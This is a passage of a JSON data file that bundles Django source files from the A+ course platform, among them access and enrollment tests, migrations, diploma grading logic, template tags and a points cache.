chapter page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # chapter exercise\n        chapter_exercise = self.learning_objects[self.public_course_instance.id][1]\n        url = '/Course-Url/public/test-module/chapter1/embedexercise/plain/'\n        # anonymous user can open the chapter exercise\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in internal user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter exercise normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # normal exercise (not inside chapter)\n        exercise = self.learning_objects[self.public_course_instance.id][2]\n        url = reverse('exercise', kwargs={\n            'exercise_path': exercise.url,\n            'module_slug': exercise.course_module.url,\n            'instance_slug': exercise.course_module.course_instance.url,\n            'course_slug': exercise.course_module.course_instance.course.url,\n        })\n        self.assertEqual(url, '/Course-Url/public/test-module/normalexercise/')\n        # anonymous user can open the exercise\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the exercise page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n    def test_submission(self):\n        # submission in the chapter exercise\n        chapter_exercise = self.learning_objects[self.enrolled_course_instance.id][1]\n        submission = self.submissions[chapter_exercise.id][0]\n        url = submission.get_absolute_url()\n        self.assertEqual(url,\n            '/Course-Url/enrolled/test-module/chapter1/embedexercise/submissions/{0}/'.format(\n                submission.id))\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # non-submitter user should not see the submission\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # the submitter should see her submission\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n    def test_enroll(self):\n        self.assertTrue(self.enrolled_course_instance.is_enrollable(self.user))\n        self.assertTrue(self.enrolled_course_instance.is_enrollment_open())\n\n        # course instance is hidden from students\n        new_instance = CourseInstance.objects.create(\n            instance_name=\"Hidden course instance\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"hiddencourse\",\n            view_content_to=CourseInstance.VIEW_ACCESS.PUBLIC,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n            visible_to_students=False,\n        )\n        url = new_instance.get_url('enroll')\n        # anonymous user accesses a hidden course: redirect to login\n        response = self.client.post(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n\n        # enrollment closed\n        new_instance.visible_to_students = True\n        new_instance.enrollment_starting_time = self.yesterday\n        new_instance.enrollment_ending_time = self.yesterday + timedelta(hours=1)\n        new_instance.save()\n        url = new_instance.get_url('enroll')\n        self.assertTrue(new_instance.is_enrollable(self.user))\n        self.assertFalse(new_instance.is_enrollment_open())\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.get(url)\n        # can open the enrollment page\n        self.assertEqual(response.status_code, 200)\n        # can not enroll\n        response = self.client.post(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n\n    def test_enrollment_exercise(self):\n        instance = self.enrolled_course_instance\n        enroll_exercise = self.learning_objects[instance.id][2]\n        enroll_exercise.status = LearningObject.STATUS.ENROLLMENT\n        enroll_exercise.save()\n        enroll_url = instance.get_url('enroll')\n        exercise_url = reverse('exercise', kwargs={\n            'exercise_path': enroll_exercise.url,\n            'module_slug': enroll_exercise.course_module.url,\n            'instance_slug': enroll_exercise.course_module.course_instance.url,\n            'course_slug': enroll_exercise.course_module.course_instance.course.url,\n        })\n\n        # anonymous may not open the exercise nor enroll\n        response = self.client.post(enroll_url)\n        self.assertRedirects(response, '/accounts/login/?next=' + enroll_url)\n        response = self.client.get(exercise_url)\n        self.assertRedirects(response, '/accounts/login/?next=' + exercise_url)\n        response = self.client.post(exercise_url)\n        self.assertRedirects(response, '/accounts/login/?next=' + exercise_url)\n        # the course has only one enrollment (made in setUp())\n        self.assertEqual(instance.students.count(), 1)\n\n        # logged-in user may open the exercise and submit\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.post(enroll_url)\n        self.assertRedirects(response, exercise_url) # redirects to the enrollment exercise\n        response = self.client.get(exercise_url)\n        self.assertEqual(response.status_code, 200)\n        # Since there is no exercise service running in the unit test environment,\n        # we can not make test submissions to the exercise.\n        success_flag, warnings, students = enroll_exercise.check_submission_allowed(self.user.userprofile)\n        self.assertEqual(success_flag, BaseExercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(len(warnings), 0)\n        instance.enroll_student(self.user)\n        self.assertEqual(instance.students.count(), 2)\n        self.assertTrue(instance.is_student(self.user))\n        self.client.logout()\n\n    def test_enrollment_exercise_external_users(self):\n        # only external users may enroll\n        instance = self.enrolled_course_instance\n        instance.enrollment_audience = CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS\n        instance.save()\n\n        enroll_exercise = self.learning_objects[instance.id][2]\n        enroll_exercise.status = LearningObject.STATUS.ENROLLMENT_EXTERNAL\n        enroll_exercise.save()\n        enroll_url = instance.get_url('enroll')\n        exercise_url = reverse('exercise', kwargs={\n            'exercise_path': enroll_exercise.url,\n            'module_slug': enroll_exercise.course_module.url,\n            'instance_slug': enroll_exercise.course_module.course_instance.url,\n            'course_slug': enroll_exercise.course_module.course_instance.course.url,\n        })\n\n        # internal user may not enroll\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.post(enroll_url)\n        self.assertEqual(response.status_code, 403)\n        response = self.client.get(exercise_url)\n        self.assertEqual(response.status_code, 403)\n        response = self.client.post(exercise_url)\n        self.assertEqual(response.status_code, 403)\n        self.assertFalse(instance.is_student(self.user))\n        self.client.logout()\n\n    def tearDown(self):\n        # return previous logging settings\n        logging.disable(logging.NOTSET)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/tests.py",
        "source": "from datetime import timedelta\n\nfrom django.contrib.auth.models import User\nfrom django.core.urlresolvers import reverse\nfrom django.test import TestCase\nfrom django.test.client import Client\nfrom django.utils import timezone\n\nfrom course.models import Course, CourseInstance, CourseHook, CourseModule, \\\n    LearningObjectCategory, StudentGroup\nfrom exercise.models import BaseExercise, Submission\nfrom exercise.exercise_models import LearningObject\n\n\nclass CourseTest(TestCase):\n    def setUp(self):\n        self.client = Client()\n\n        self.user = User(username=\"testUser\")\n        self.user.set_password(\"testPassword\")\n        self.user.save()\n\n        self.grader = User(username=\"grader\", is_staff=True)\n        self.grader.set_password(\"graderPassword\")\n        self.grader.save()\n\n        self.superuser = User(username=\"staff\", is_staff=False, is_superuser=True)\n        self.superuser.set_password(\"staffPassword\")\n        self.superuser.save()\n\n        self.course = Course.objects.create(\n            name=\"test course\",\n            code=\"123456\",\n            url=\"Course-Url\"\n        )\n\n        self.today = timezone.now()\n        self.tomorrow = self.today + timedelta(days=1)\n        self.two_days_from_now = self.tomorrow + timedelta(days=1)\n        self.yesterday = self.today - timedelta(days=1)\n\n        self.past_course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 0\",\n            starting_time=self.yesterday,\n            ending_time=self.today,\n            course=self.course,\n            url=\"T-00.1000_d0\"\n        )\n\n        self.current_course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 1\",\n            starting_time=self.today,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"T-00.1000_d1\"\n        )\n\n        self.future_course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 2\",\n            starting_time=self.tomorrow,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"T-00.1000_d2\"\n        )\n\n        self.hidden_course_instance = CourseInstance.objects.create(\n            instance_name=\"Secret super course\",\n            starting_time=self.tomorrow,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"T-00.1000_hidden\",\n            visible_to_students=False\n        )\n\n        self.course_module = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module\",\n            points_to_pass=10,\n            course_instance=self.current_course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow\n        )\n\n        self.course_module_with_late_submissions_allowed = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module-late\",\n            points_to_pass=50,\n            course_instance=self.current_course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow,\n            late_submissions_allowed=True,\n            late_submission_deadline=self.two_days_from_now,\n            late_submission_penalty=0.2\n        )\n\n        self.learning_object_category = LearningObjectCategory.objects.create(\n            name=\"test category\",\n            course_instance=self.current_course_instance,\n            points_to_pass=5\n        )\n\n        #self.hidden_learning_object_category = LearningObjectCategory.objects.create(\n        #    name=\"hidden category\",\n        #    course_instance=self.current_course_instance\n        #)\n        #self.hidden_learning_object_category.hidden_to.add(self.user.userprofile)\n\n        self.learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url='l1',\n        )\n\n        self.broken_learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module_with_late_submissions_allowed,\n            category=self.learning_object_category,\n            url='l2',\n        )\n\n        self.base_exercise = BaseExercise.objects.create(\n            name=\"test exercise\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            service_url=\"http://localhost/\",\n            url='b1',\n        )\n\n        self.submission = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile\n        )\n        self.submission.submitters.add(self.user.userprofile)\n\n        self.course_hook = CourseHook.objects.create(\n            hook_url=\"test_hook_url\",\n            course_instance=self.current_course_instance\n        )\n\n    def test_course_instance_open(self):\n        self.assertFalse(self.past_course_instance.is_open())\n        self.assertTrue(self.current_course_instance.is_open())\n        self.assertFalse(self.future_course_instance.is_open())\n\n    def test_course_url(self):\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/\", self.current_course_instance.get_absolute_url())\n        self.assertEqual(\"/Course-Url/T-00.1000_hidden/\", self.hidden_course_instance.get_absolute_url())\n\n    def test_course_staff(self):\n        self.assertFalse(self.course.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_assistant(self.user))\n        self.assertFalse(self.current_course_instance.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))\n\n        self.current_course_instance.assistants.add(self.user.userprofile)\n\n        self.assertFalse(self.course.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_assistant(self.user))\n        self.assertFalse(self.current_course_instance.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))\n\n        self.course.teachers.add(self.user.userprofile)\n\n        self.assertTrue(self.course.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_assistant(self.user))\n        self.assertTrue(self.current_course_instance.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))\n        self.assertEquals(\"testUser\", self.current_course_instance.get_course_staff_profiles()[0].shortname)\n\n        self.current_course_instance.assistants.clear()\n\n        self.assertTrue(self.course.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_assistant(self.user))\n        self.assertTrue(self.current_course_instance.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))\n\n        self.course.teachers.clear()\n\n        self.assertFalse(self.course.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_assistant(self.user))\n        self.assertFalse(self.current_course_instance.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))\n\n    def test_course_instance_submitters(self):\n        students = self.current_course_instance.get_submitted_profiles()\n        self.assertEquals(1, len(students))\n        self.assertEquals(\"testUser\", students[0].shortname)\n\n        submission2 = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile)\n        submission2.submitters.add(self.user.userprofile)\n\n        students = self.current_course_instance.get_submitted_profiles()\n        self.assertEquals(1, len(students))\n        self.assertEquals(\"testUser\", students[0].shortname)\n\n        submission3 = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.user.userprofile)\n        submission3.submitters.add(self.grader.userprofile)\n\n        students = self.current_course_instance.get_submitted_profiles()\n        self.assertEquals(2, len(students))\n        self.assertEquals(\"testUser\", students[0].shortname)\n        self.assertEquals(\"grader\", students[1].shortname)\n\n    def test_course_instance_visibility(self):\n        self.assertTrue(self.current_course_instance.is_visible_to())\n        self.assertFalse(self.hidden_course_instance.is_visible_to())\n        self.assertTrue(self.current_course_instance.is_visible_to(self.user))\n        self.assertFalse(self.hidden_course_instance.is_visible_to(self.user))\n        self.assertTrue(self.current_course_instance.is_visible_to(self.superuser))\n        self.assertTrue(self.hidden_course_instance.is_visible_to(self.superuser))\n\n    def test_course_instance_get_visible(self):\n        open_course_instances = CourseInstance.objects.get_visible()\n        self.assertEqual(3, len(open_course_instances))\n        self.assertTrue(self.current_course_instance in open_course_instances)\n        self.assertTrue(self.future_course_instance in open_course_instances)\n\n        open_course_instances = CourseInstance.objects.get_visible(self.user)\n        self.assertEqual(3, len(open_course_instances))\n        self.assertTrue(self.current_course_instance in open_course_instances)\n        self.assertTrue(self.future_course_instance in open_course_instances)\n\n        open_course_instances = CourseInstance.objects.get_visible(self.superuser)\n        self.assertEqual(4, len(open_course_instances))\n        self.assertTrue(self.current_course_instance in open_course_instances)\n        self.assertTrue(self.future_course_instance in open_course_instances)\n        self.assertTrue(self.hidden_course_instance in open_course_instances)\n\n    def test_course_instance_unicode_string(self):\n        self.assertEquals(\"123456 test course: Fall 2011 day 1\", str(self.current_course_instance))\n        self.assertEquals(\"123456 test course: Secret super course\", str(self.hidden_course_instance))\n\n    def test_course_hook_unicode_string(self):\n        self.assertEquals(\"123456 test course: Fall 2011 day 1 -> test_hook_url\", str(self.course_hook))\n\n    def test_course_module_late_submission_point_worth(self):\n        self.assertEquals(0, self.course_module.get_late_submission_point_worth())\n        self.assertEquals(80, self.course_module_with_late_submissions_allowed.get_late_submission_point_worth())\n\n    def test_course_module_open(self):\n        self.assertFalse(self.course_module.is_open(self.yesterday))\n        self.assertTrue(self.course_module.is_open(self.today))\n        self.assertTrue(self.course_module.is_open())\n        self.assertTrue(self.course_module.is_open(self.tomorrow))\n        self.assertFalse(self.course_module.is_open(self.two_days_from_now))\n\n    def test_course_module_after_open(self):\n        self.assertFalse(self.course_module.is_after_open(self.yesterday))\n        self.assertTrue(self.course_module.is_after_open(self.today))\n        self.assertTrue(self.course_module.is_after_open())\n        self.assertTrue(self.course_module.is_after_open(self.tomorrow))\n        self.assertTrue(self.course_module.is_after_open(self.two_days_from_now))\n\n    def test_course_views(self):\n        response = self.client.get('/no_course/test', follow=True)\n        self.assertEqual(response.status_code, 404)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertTrue(response.redirect_chain)\n        self.assertEqual(response.status_code, 200)\n        self.assertTemplateUsed(response, 'userprofile/login.html')\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get('/no_course/test', follow=True)\n        self.assertEqual(response.status_code, 404)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 200)\n\n        self.assertEqual(response.context[\"course\"], self.course)\n        self.assertEqual(response.context[\"instance\"], self.current_course_instance)\n        self.assertFalse(response.context[\"is_assistant\"])\n        self.assertFalse(response.context[\"is_teacher\"])\n\n        response = self.client.get(self.hidden_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 403)\n\n    def test_course_teacher_views(self):\n        url = self.current_course_instance.get_edit_url()\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n\n        self.current_course_instance.assistants.add(self.grader.userprofile)\n        self.client.login(username=\"grader\", password=\"graderPassword\")\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 200)\n        self.assertTrue(response.context[\"is_assistant\"])\n        self.assertFalse(response.context[\"is_teacher\"])\n\n        self.current_course_instance.assistants.clear()\n        self.course.teachers.add(self.grader.userprofile)\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 200)\n        self.assertFalse(response.context[\"is_assistant\"])\n        self.assertTrue(response.context[\"is_teacher\"])\n\n        self.client.logout()\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"staff\", password=\"staffPassword\")\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.assertFalse(response.context[\"is_assistant\"])\n        self.assertTrue(response.context[\"is_teacher\"])\n\n    def test_groups(self):\n        group = StudentGroup(course_instance=self.current_course_instance)\n        group.save()\n        group.members.add(self.user.userprofile,self.grader.userprofile)\n        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,\n            [self.user.userprofile,self.grader.userprofile]), group)\n        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,\n            [self.user.userprofile,self.superuser.userprofile]), None)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/deviations/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0006_auto_20150625_1823'),\n        ('userprofile', '0002_auto_20150427_1717'),\n    ]\n\n    state_operations = [\n        migrations.CreateModel(\n            name='DeadlineRuleDeviation',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('extra_minutes', models.IntegerField()),\n                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),\n                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='MaxSubmissionsRuleDeviation',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('extra_submissions', models.IntegerField()),\n                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),\n                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='maxsubmissionsruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n        migrations.AlterUniqueTogether(\n            name='deadlineruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n    ]\n    \n    operations = [\n        migrations.SeparateDatabaseAndState(state_operations=state_operations)\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/diploma/grade.py",
        "source": "from copy import copy\n\n\ndef calculate_grade(total_points, point_limits, pad_points):\n    points = total_points['points']\n    d_points = copy(total_points['points_by_difficulty'])\n\n    def pass_limit(bound):\n        if isinstance(bound, list):\n            ds,ls = zip(*bound)\n            for i,d in enumerate(ds):\n\n                if pad_points:\n                    p = d_points.get(d, 0)\n                    l = ls[i]\n                    if p < l:\n                        for j in range(i + 1, len(ds)):\n                            jd = ds[j]\n                            jp = d_points.get(jd, 0)\n                            if jp > l - p:\n                                d_points[jd] -= l - p\n                                d_points[d] = l\n                                break\n                            else:\n                                p += jp\n                                d_points[d] = p\n                                d_points[jd] = 0\n                    else:\n                        continue\n\n                if d_points.get(d, 0) < ls[i]:\n                    return False\n\n            return True\n        else:\n            return points >= bound\n\n    grade = 0\n    for bound in point_limits:\n        if pass_limit(bound):\n            grade += 1\n        else:\n            break\n    return grade\n\n\ndef assign_grade(cached_points, diploma_design):\n\n    if not (diploma_design and cached_points.user.is_authenticated()):\n        return -1\n\n    if not diploma_design.course.is_course_staff(cached_points.user):\n        avail = diploma_design.availability\n        opt = diploma_design.USERGROUP\n        external = cached_points.user.userprofile.is_external\n        if (\n            (avail == opt.EXTERNAL_USERS and not external)\n            or (avail == opt.INTERNAL_USERS and external)\n        ):\n            return -1\n\n    def is_passed(model):\n        entry,_,_,_ = cached_points.find(model)\n        return entry['passed']\n    if not all(is_passed(m) for m in diploma_design.modules_to_pass.all()):\n        return 0\n    if not all(is_passed(e) for e in diploma_design.exercises_to_pass.all()):\n        return 0\n\n    return calculate_grade(\n        cached_points.total(),\n        diploma_design.point_limits,\n        diploma_design.pad_points\n    )\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/diploma/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.db.models.deletion\nimport diploma.models\nimport lib.models\nimport lib.fields\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0024_auto_20160919_1951'),\n        ('course', '0030_auto_20160912_1341'),\n        ('userprofile', '0003_auto_20160728_1139'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseDiplomaDesign',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('logo', models.ImageField(null=True, blank=True, upload_to=diploma.models.build_upload_dir)),\n                ('title', models.TextField(blank=True)),\n                ('body', models.TextField(blank=True)),\n                ('date', models.CharField(max_length=256)),\n                ('signature_name', models.CharField(blank=True, max_length=256)),\n                ('signature_title', models.CharField(blank=True, max_length=256)),\n                ('small_print', models.TextField(blank=True)),\n                ('point_limits', lib.fields.JSONField(blank=True, help_text='A list of length 5 where each element is the required points for n:th grade.The element can be a list of 2-tuples [[difficulty_level_a, points],[difficulty_level_b, points]].')),\n                ('pad_points', models.BooleanField(help_text='If difficulty levels are used the lower level can be padded with higher level points.', default=False)),\n                ('course', models.OneToOneField(on_delete=django.db.models.deletion.SET_NULL, to='course.CourseInstance', null=True)),\n                ('exercises_to_pass', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),\n                ('modules_to_pass', models.ManyToManyField(blank=True, to='course.CourseModule')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='StudentDiploma',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('created', models.DateTimeField(auto_now=True)),\n                ('hashkey', models.CharField(unique=True, max_length=32)),\n                ('name', models.CharField(max_length=255)),\n                ('grade', models.PositiveIntegerField(default=0)),\n                ('design', models.ForeignKey(to='diploma.CourseDiplomaDesign')),\n                ('profile', models.ForeignKey(on_delete=django.db.models.deletion.SET_NULL, to='userprofile.UserProfile', null=True)),\n            ],\n            options={\n            },\n            bases=(lib.models.UrlMixin, models.Model),\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/diploma/templatetags/diploma.py",
        "source": "from django import template\nfrom django.core.urlresolvers import reverse\n\nfrom exercise.templatetags.exercise import _prepare_context\nfrom ..grade import assign_grade\nfrom ..models import CourseDiplomaDesign\n\n\nregister = template.Library()\n\n\n@register.inclusion_tag(\"diploma/_diploma_button.html\", takes_context=True)\ndef diploma_button(context, student=None):\n    points = _prepare_context(context, student)\n    design = CourseDiplomaDesign.objects.filter(course=points.instance).first()\n    url = None\n    if design and points.user.is_authenticated():\n        url = reverse('diploma-create', kwargs={\n            'coursediploma_id': design.id,\n            'userprofile_id': points.user.userprofile.id,\n        })\n    return {\n        'grade': assign_grade(points, design),\n        'url': url,\n        'is_course_staff': context.get('is_course_staff'),\n    }\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/edit_course/templatetags/editcourse.py",
        "source": "from django import template\nfrom django.core.urlresolvers import reverse\n\nfrom course.models import CourseInstance\n\n\nregister = template.Library()\n\n\ndef _normal_kwargs(instance, model_name, **extra_kwargs):\n    kwargs = instance.get_url_kwargs()\n    kwargs.update({\n        \"model\": model_name,\n    })\n    kwargs.update(extra_kwargs)\n    return kwargs\n\n\n@register.filter\ndef editurl(model_object, model_name):\n    return reverse('model-edit', kwargs=_normal_kwargs(\n        model_object.course_instance,\n        model_name,\n        id=model_object.id,\n    ))\n\n\n@register.filter\ndef removeurl(model_object, model_name):\n    return reverse('model-remove', kwargs=_normal_kwargs(\n        model_object.course_instance,\n        model_name,\n        id=model_object.id,\n    ))\n\n\n@register.filter\ndef createurl(model_object, model_name):\n    type_name = None\n    if \",\" in model_name:\n        model_name, type_name = model_name.split(\",\", 1)\n    if isinstance(model_object, CourseInstance):\n        return reverse('model-create', kwargs=_normal_kwargs(\n            model_object,\n            model_name,\n        ))\n    if type_name:\n        return reverse('model-create-type-for', kwargs=_normal_kwargs(\n            model_object.course_instance,\n            model_name,\n            parent_id=model_object.id,\n            type=type_name,\n        ))\n    return reverse('model-create-for', kwargs=_normal_kwargs(\n        model_object.course_instance,\n        model_name,\n        parent_id=model_object.id,\n    ))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/cache/points.py",
        "source": "from copy import deepcopy\nfrom django.db.models.signals import post_save, post_delete, m2m_changed\nfrom django.utils import timezone\n\nfrom lib.cache import CachedAbstract\nfrom notification.models import Notification\nfrom ..models import LearningObject, Submission\nfrom .hierarchy import ContentMixin\n\n\nclass CachedPoints(ContentMixin, CachedAbstract):\n    KEY_PREFIX = 'points'\n\n    def __init__(self, course_instance, user, content):\n        self.content = content\n        self.instance = course_instance\n        self.user = user\n        super().__init__(course_instance, user)\n\n    def _needs_generation(self, data):\n        return data is None or data['created'] < self.content.created()\n\n    def _generate_data(self, instance, user, data=None):\n        data = deepcopy(self.content.data)\n        module_index = data['module_index']\n        exercise_index = data['exercise_index']\n        modules = data['modules']\n        categories = data['categories']\n        total = data['total']\n\n        # Augment submission parameters.\n        def r_augment(children):\n            for entry in children:\n                if entry['submittable']:\n                    entry.update({\n                        'submission_count': 0,\n                        'submissions': [],\n                        'best_submission': None,\n                        'points': 0,\n                        'passed': entry['points_to_pass'] == 0,\n                        'graded': False,\n                        'unofficial': False,\n                    })\n                r_augment(entry.get('children'))\n        for module in modules:\n            module.update({\n                'submission_count': 0,\n                'points': 0,\n                'points_by_difficulty': {},\n                'unconfirmed_points_by_difficulty': {},\n                'passed': module['points_to_pass'] == 0,\n            })\n            r_augment(module['children'])\n        for entry in categories.values():\n            entry.update({\n                'submission_count': 0,\n                'points': 0,\n                'points_by_difficulty': {},\n                'unconfirmed_points_by_difficulty': {},\n                'passed': entry['points_to_pass'] == 0,\n            })\n        total.update({\n            'submission_count': 0,\n            'points': 0,\n            'points_by_difficulty': {},\n            'unconfirmed_points_by_difficulty': {},\n        })\n\n        # Augment submission data.\n        if user.is_authenticated():\n            submissions = (\n                user.userprofile.submissions.exclude_errors()\n                .filter(exercise__course_module__course_instance=instance)\n                .prefetch_related('exercise')\n                .only('id', 'exercise', 'submission_time', 'status', 'grade')\n            )\n            for submission in submissions:\n                try:\n                    tree = self._by_idx(modules, exercise_index[submission.exercise.id])\n                except KeyError:\n                    self.dirty = True\n                    continue\n                entry = tree[-1]\n                entry['submission_count'] += 1 if not submission.status in (Submission.STATUS.ERROR, Submission.STATUS.UNOFFICIAL) else 0\n                unofficial = submission.status == Submission.STATUS.UNOFFICIAL\n                entry['submissions'].append({\n                    'id': submission.id,\n                    'max_points': entry['max_points'],\n                    'points_to_pass': entry['points_to_pass'],\n                    'confirm_the_level': entry.get('confirm_the_level', False),\n                    'submission_count': 1, # to fool points badge\n                    'points': submission.grade,\n                    'graded': submission.is_graded,\n                    'passed': submission.grade >= entry['points_to_pass'],\n                    'submission_status': submission.status if not submission.is_graded else False,\n                    